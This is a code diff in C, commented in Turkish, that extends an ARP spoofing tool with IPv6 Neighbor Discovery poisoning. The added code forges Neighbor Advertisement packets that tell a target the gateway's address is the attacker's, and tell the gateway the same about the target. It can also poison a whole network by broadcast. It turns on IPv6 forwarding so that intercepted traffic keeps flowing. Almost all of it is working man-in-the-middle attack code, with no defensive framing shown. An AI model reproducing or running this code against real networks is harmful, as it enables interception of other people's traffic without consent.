+/* Solicited-node multicast adresi: ff02::1:ffXX:XXXX (opsiyonel yardimci) */
+static void ndp_solicited_mcast(const unsigned char mac[6], unsigned char out[16]) {
+    memset(out, 0, 16);
+    out[0] = 0xff; out[1] = 0x02;
+    out[11] = 0x01;
+    out[12] = 0xff;
+    out[13] = mac[3];
+    out[14] = mac[4];
+    out[15] = mac[5];
+}
+
+/* ICMPv6 checksum (RFC 4443 pseudo-header ile) */
+static unsigned short icmp6_checksum(const unsigned char *src, const unsigned char *dst,
+                                     const unsigned char *payload, int payload_len) {
+    unsigned long sum = 0;
+    for (int i = 0; i < 16; i += 2) {
+        sum += ((unsigned int)src[i] << 8) | src[i + 1];
+        sum += ((unsigned int)dst[i] << 8) | dst[i + 1];
+    }
+    int nh = 58;   /* ICMPv6 */
+    sum += (unsigned int)(payload_len >> 16) + (unsigned int)(payload_len & 0xFFFF);
+    sum += (unsigned int)nh;
+    for (int i = 0; i < payload_len; i += 2) {
+        unsigned int w = payload[i];
+        if (i + 1 < payload_len) w = (w << 8) | payload[i + 1];
+        sum += w;
+    }
+    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+    return (unsigned short)(~sum);
+}
+
+/* 86 baytlik NDP NA zehirleme karesi gonder */
+static void ndp_send_na(int raw_fd, const char *iface,
+                        const unsigned char *src_mac, const char *src_v6,
+                        const unsigned char *tgt_mac, const char *tgt_v6,
+                        int flags) {
+    if (raw_fd < 0 || !src_mac || !src_v6 || !tgt_mac || !tgt_v6) return;
+    unsigned char f[86];
+    memset(f, 0, sizeof(f));
+
+    /* Ethernet header (14) */
+    memcpy(f, tgt_mac, 6);
+    memcpy(f + 6, src_mac, 6);
+    f[12] = 0x86; f[13] = 0xDD;              /* EtherType: IPv6 */
+
+    /* IPv6 header (40) */
+    f[14] = 0x60;                            /* versiyon 6 */
+    f[19] = 0x20;                            /* payload uzunlugu = 32 */
+    f[20] = 58;                              /* next header: ICMPv6 */
+    f[21] = 255;                             /* hop limit */
+    inet_pton(AF_INET6, src_v6, f + 22);
+    inet_pton(AF_INET6, tgt_v6, f + 38);
+
+    /* ICMPv6 Neighbor Advertisement (32: baslik 24 + TLL 8) */
+    f[54] = 136;                             /* NA tipi */
+    f[58] = (unsigned char)((flags >> 24) & 0xFF);   /* R|S|O bayraklari */
+    f[59] = (unsigned char)((flags >> 16) & 0xFF);
+    f[60] = (unsigned char)((flags >> 8) & 0xFF);
+    f[61] = (unsigned char)(flags & 0xFF);
+    inet_pton(AF_INET6, tgt_v6, f + 62);     /* hedef adres */
+    f[78] = 2;                               /* Target Link-Layer (TLL) secenegi */
+    f[79] = 1;                               /* uzunluk: 8 bayt */
+    memcpy(f + 80, src_mac, 6);
+
+    unsigned short cs = icmp6_checksum(f + 22, f + 38, f + 54, 32);
+    f[56] = (unsigned char)(cs >> 8);
+    f[57] = (unsigned char)(cs & 0xFF);
+
+    struct sockaddr_ll addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sll_family   = AF_PACKET;
+    addr.sll_ifindex  = if_nametoindex(iface);
+    addr.sll_protocol = htons(ETH_P_IPV6);
+    memcpy(addr.sll_addr, tgt_mac, 6);
+    addr.sll_halen    = 6;
+    sendto(raw_fd, f, 86, 0, (struct sockaddr *)&addr, sizeof(addr));
+}
+
+/* Zehirleme dongusu: kilidi kendisi alir, arp_spoof_loop her 1 sn cagirir */
+static void ndp_poison_cycle(int raw_fd, const char *iface) {
+    if (raw_fd < 0 || !g_gateway_v6_valid || !g_my_mac[0]) return;
+    int single_mode = (g_spoof_target_ip[0] != '\0');
+    platform_mutex_lock(&g_spoof_lock);
+    if (single_mode) {
+        if (g_target_mac_valid) {
+            char tgt6[INET6_ADDRSTRLEN];
+            if (mac_to_linklocal(g_target_mac, tgt6, sizeof(tgt6)) == 0) {
+                /* Hedefe: "gateway'in link-local'i benim" */
+                ndp_send_na(raw_fd, iface, g_my_mac, g_gateway_v6,
+                            g_target_mac, tgt6, 0x20000000);
+                /* Gateway'e: "hedefin link-local'i benim" */
+                ndp_send_na(raw_fd, iface, g_my_mac, tgt6,
+                            g_gateway_v6_mac, g_gateway_v6, 0x20000000);
+            }
+        }
+    } else {
+        /* Tum ag modu: all-nodes NA + her hedefe ozel NA */
+        unsigned char bcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+        ndp_send_na(raw_fd, iface, g_my_mac, g_gateway_v6,
+                    bcast_mac, "ff02::1", 0x60000000);
+        for (int i = 0; i < g_spoof_target_count; i++) {
+            SpoofTarget *t = &g_spoof_targets[i];
+            if (!t->mac_valid || !t->ip[0]) continue;
+            char tgt6[INET6_ADDRSTRLEN];
+            if (mac_to_linklocal(t->mac, tgt6, sizeof(tgt6)) != 0) continue;
+            ndp_send_na(raw_fd, iface, g_my_mac, g_gateway_v6,
+                        t->mac, tgt6, 0x20000000);
+        }
+    }
+    platform_mutex_unlock(&g_spoof_lock);
+}
+
+/* --- IPv6 forwarding ac/kapa (/proc/sys/net/ipv6/conf/all/forwarding) --- */
+void enable_ipv6_forward(void) {
+    FILE *f = fopen("/proc/sys/net/ipv6/conf/all/forwarding", "w");
+    if (f) {
+        fprintf(f, "1");
+        fclose(f);
+        fprintf(stderr, "[NDP] IPv6 forwarding acildi\n");
+    } else {
+        fprintf(stderr, "[NDP] IPv6 forwarding acilamadi (root gerekli)\n");
+    }
+}
+
+void disable_ipv6_forward(void) {
+    FILE *f = fopen("/proc/sys/net/ipv6/conf/all/forwarding", "w");
+    if (f) {
+        fprintf(f, "0");
+        fclose(f);
+        fprintf(stderr, "[NDP] IPv6 forwarding kapatildi\n");
+    }
+}
+
 /* --- Public API --- */
 static void spoof_lock_ensure_init(void) {
     if (!g_spoof_lock_init) {
@@ -2073,6 +2703,7 @@ void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *
 
     /* IP forwarding aç (yoksa MITM paketleri düşer) */
     enable_ip_forward();
+    enable_ipv6_forward();
 
     g_arp_spoof_running = 1;
     platform_thread_create(&g_arp_thread, arp_spoof_loop, NULL);
@@ -2092,6 +2723,7 @@ void arp_spoof_start_all(const char *gateway_ip, const char *iface) {
     g_spoof_target_count = 0;
 
     enable_ip_forward();
+    enable_ipv6_forward();
 
     g_arp_spoof_running = 1;
     platform_thread_create(&g_arp_thread, arp_spoof_loop, NULL);
@@ -2105,6 +2737,13 @@ void arp_spoof_sync_targets(const Device *devices, int count,
     if (!devices || count <= 0) return;
 
     platform_mutex_lock(&g_spoof_lock);
+    /* Eski last_seen degerlerini sakla (yeniden senkronizasyonda korunur) */
+    char   old_ips[MAX_SPOOF_TARGETS][MAX_IP_LEN];
+    double old_seen[MAX_SPOOF_TARGETS];
+    for (int i = 0; i < MAX_SPOOF_TARGETS; i++) {
+        strncpy(old_ips[i], g_spoof_targets[i].ip, MAX_IP_LEN - 1);
+        old_seen[i] = g_spoof_targets[i].last_seen;
+    }
     g_spoof_target_count = 0;
     for (int i = 0; i < count && g_spoof_target_count < MAX_SPOOF_TARGETS; i++) {
         const Device *d = &devices[i];
@@ -2113,6 +2752,14 @@ void arp_spoof_sync_targets(const Device *devices, int count,
         if (local_ip && strcmp(d->ip, local_ip) == 0) continue;
         SpoofTarget *t = &g_spoof_targets[g_spoof_target_count];
         strncpy(t->ip, d->ip, sizeof(t->ip) - 1);
+        /* Ayni hedef onceki listede varsa last_seen degerini tasi */
+        t->last_seen = 0.0;
+        for (int k = 0; k < MAX_SPOOF_TARGETS; k++) {
+            if (old_seen[k] > 0 && strcmp(old_ips[k], d->ip) == 0) {
+                t->last_seen = old_seen[k];
+                break;
+            }
+        }
         if (spoof_parse_mac(d->mac, t->mac) == 0) {
             t->mac_valid = 1;
             g_spoof_target_count++;
@@ -2134,11 +2781,16 @@ void arp_spoof_stop(void) {
     /* Thread'in temizlik yapması için bekle */
     platform_sleep_ms(1500);
 
-    /* IP forwarding'i eski haline getir */
+    /* IP forwarding'i eski haline getir (IPv6 dahil) */
     disable_ip_forward();
+    disable_ipv6_forward();
 
     g_spoof_target_ip[0] = '\0';
     g_spoof_target_count = 0;
+    g_target_last_seen = 0.0;
+    g_gateway_mac_valid = 0;
+    g_gateway_v6_valid = 0;
+    g_gateway_v6_mac_valid = 0;
     fprintf(stderr, "[ARP_SPOOF] Tamamen durduruldu.\n");
 }
 
@@ -2150,4 +2802,3 @@ const char *arp_spoof_get_target(void) {
     return g_spoof_target_ip;
 }
 
-#endif /* PLATFORM_LINUX */
